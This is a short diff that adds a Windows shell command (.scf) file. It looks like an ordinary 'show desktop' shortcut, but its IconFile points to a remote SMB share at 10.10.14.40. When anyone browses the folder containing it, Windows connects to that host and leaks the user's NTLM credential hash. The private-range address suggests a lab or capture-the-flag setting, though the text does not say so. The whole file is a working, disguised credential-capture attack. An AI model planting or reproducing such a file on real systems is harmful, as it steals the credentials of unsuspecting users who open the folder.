@@ -1,0 +1,5 @@
+[Shell]
+Command=2
+IconFile=\\10.10.14.40\cclesputes
+[Taskbar]
+Command=ToggleDesktop
